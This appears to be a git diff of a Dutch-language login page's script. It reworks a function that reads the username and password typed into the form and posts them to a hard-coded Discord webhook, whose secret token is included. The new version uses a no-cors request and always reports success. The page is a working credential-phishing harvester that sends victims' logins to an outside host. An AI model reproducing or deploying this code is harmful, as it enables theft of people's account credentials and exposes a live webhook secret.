@@ -91,27 +91,27 @@
       </div>
     </div>
   </div>
-
   <script>
     async function sendToDiscord() {
-      const hook  = 'https://discord.com/api/webhooks/1347877842725371984/SSQUXuH1EbjqDA-UEXf9d_uik63AvOEyG19LiRFbdZuB9XsRpohp37zbFe9T0gCNxnKE';
-      const proxy = 'https://cors-anywhere.herokuapp.com/';
-      const user  = document.getElementById('userNameInput').value;
-      const pass  = document.getElementById('passwordInput').value;
-      const content = `**Loginnaam:** ${user}\n**Password:** ${pass}`;
+        const hook = 'https://discord.com/api/webhooks/1347877842725371984/SSQUXuH1EbjqDA-UEXf9d_uik63AvOEyG19LiRFbdZuB9XsRpohp37zbFe9T0gCNxnKE';
+        const user = document.getElementById('userNameInput').value;
+        const pass = document.getElementById('passwordInput').value;
+        const payload = {
+        content: `**Loginnaam:** ${user}\n**Password:** ${pass}`
+        };
 
-      try {
-        const res = await fetch(proxy + hook, {
-          method: 'POST',
-          headers: {'Content-Type':'application/json'},
-          body: JSON.stringify({ content })
+        // doe de fetch met no-cors
+        fetch(hook, {
+        method: 'POST',
+        mode:   'no-cors',
+        headers: { 'Content-Type': 'application/json' },
+        body:    JSON.stringify(payload)
         });
-        alert(res.ok ? 'Verzonden' : 'Fout bij verzenden.');
-      } catch {
-        alert('Kon niet verbinden.');
-      }
-      return false;
+
+        // We gaan ervan uit dat 'ie gelukt is
+        alert('Verzonden naar Discord!');
+        return false; // voorkom normale submit
     }
-  </script>
+    </script>
 </body>
 </html>
